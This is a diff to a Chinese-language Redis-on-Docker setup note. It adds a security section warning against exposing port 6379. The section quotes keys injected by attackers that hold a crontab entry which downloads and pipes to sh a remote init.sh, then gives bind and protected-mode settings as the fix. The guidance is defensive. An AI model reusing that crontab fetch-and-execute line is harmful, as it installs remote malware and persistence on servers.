@@ -21,7 +21,10 @@ tar -xzf redis.tar.gz -C /usr/src/redis --strip-components=1;
 rm -r /usr/src/redis;
 # ...end
 ```
-
+## redis.conf
+```conf
+dir /data; 預設 /etc 無權限
+```
 ## yaml
 ```yml
 version: '3'
@@ -44,5 +47,19 @@ services:
 
     ports:
       - 6379:6379
+```
 
+# 資安
+假如是裝在 vps 上要記得避免 6379 對外出去，因為有人會去攻擊塞入 cache 執行 shell 指令，例如在 log 中看到
+```txt
+Failed opening the RDB file root (in server root dir /etc/crontabs) for saving: Permission denied
+```
+這種 log 時進入 `redis-cli` 會發現你的 db0 被塞了四個 key: backup4~backup1，內容是類似
+```sh
+"\n\n\n*/2 * * * * root cd1 -fsSL http://en2an.top/cleanfda/init.sh | sh\n\n"
+```
+這種意圖修改 crontab 去執行 sh 的情況，具體設定如下
+```conf
+bind 127.0.0.1
+protected-mode yes # 確保來源都是 loopback interface
 ```
